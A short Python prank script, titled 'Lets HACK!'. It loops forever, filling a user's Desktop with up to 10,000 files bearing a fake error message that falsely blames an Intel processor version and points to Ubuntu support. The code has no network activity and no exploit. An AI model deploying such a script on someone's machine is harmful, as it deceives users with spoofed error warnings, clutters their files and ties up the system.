# Lets HACK!

import os
from random import randint

os.chdir("/home/vinicius/Desktop")
quant = 10000

while True:
    n = os.listdir(".")
    if len(n) < quant:
        error = randint(0, 10000)
        f = open("ERROR_"+str(error)+".warn", "w")
        f.write("This is an error generated due to @INTEL processor version. Please refer to our documentation at https://www.ubuntu.com/support for solutions on this problem.")
        f.write("Error number: "+str(error))